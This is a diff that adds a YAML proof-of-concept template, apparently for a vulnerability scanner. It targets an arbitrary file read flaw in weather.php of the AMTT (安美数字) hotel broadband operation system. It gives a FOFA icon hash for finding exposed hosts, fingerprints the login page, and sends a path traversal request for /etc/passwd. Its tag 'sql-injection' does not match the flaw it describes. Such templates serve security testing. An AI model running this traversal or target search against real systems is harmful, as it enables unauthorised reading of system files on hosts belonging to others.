@@ -1,0 +1,18 @@
+id: poc-yaml-amttgroup-weather-php-anyfile-read
+info:
+  name: 安美数字 酒店宽带运营系统 weather.php 任意文件读取漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 安美酒店宽带运营系统
+  fofa: icon_hash="1259797304"
+requests:
+- method: GET
+  path: /manager/login.php
+  expression: status_code == 200 && contains(title,"酒店宽带运营系统")
+- method: GET
+  path: /user/weather.php?Lang=../../../etc/passwd
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && !contains(body,"<")
+variables: {}
+transport: http
